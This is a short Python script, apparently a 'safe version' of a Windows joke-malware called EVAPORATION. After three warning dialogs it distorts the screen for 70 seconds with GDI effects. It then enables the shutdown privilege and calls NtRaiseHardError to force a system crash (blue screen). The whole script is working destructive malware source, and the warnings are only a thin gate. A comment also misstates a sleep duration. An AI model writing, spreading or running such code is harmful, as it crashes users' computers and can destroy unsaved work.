import time
import random
import win32gui
import win32api
import win32con
import math
from tkinter import Tk, messagebox
import ctypes

def run_code():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

    start_time = time.time()
    duration = 70  # Duration in seconds for GDI operations

    while time.time() - start_time < duration:
        hdc = win32gui.GetDC(0)
        color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))
        brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
        win32gui.SelectObject(hdc, brush)
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)

def raise_hard_error():
    nullptr = ctypes.POINTER(ctypes.c_uint)()

    ntdll = ctypes.WinDLL('ntdll.dll')

    ntdll.RtlAdjustPrivilege(
        ctypes.c_ulong(19),
        ctypes.c_uint(1),
        ctypes.c_uint(0),
        ctypes.byref(ctypes.c_uint())
    )

    # Define your custom error code
    DeadDead = 0xDEADDEAD

    ntdll.NtRaiseHardError(
        ctypes.c_ulong(DeadDead),
        ctypes.c_ulong(0),
        nullptr,
        nullptr,
        ctypes.c_uint(6),
        ctypes.byref(ctypes.c_uint())
    )

def show_warning():
    root = Tk()
    root.withdraw()
    result = messagebox.askquestion("Warning", "This is the 1/3 Warning Implemented into the safe version of EVAPORATION. Proceed to the 2/3 Warning?", icon='warning')
    if result == 'yes':
        second_warning_result = messagebox.askquestion("2/3 Warning", "This is the 2/3 Warning Implemented into the safe version of EVAPORATION. Proceed to the 2/3 Warning?", icon='warning')
        if second_warning_result == 'yes':
            last_warning_result = messagebox.askquestion("3/3 Warning", "This is the 3/3 Warning Implemented into the safe version of EVAPORATION. Proceed to Run The Malware?", icon='warning')
            if last_warning_result == 'yes':
                run_code()
                time.sleep(10)  # Wait for 70 seconds after GDI operations
                raise_hard_error()

show_warning()
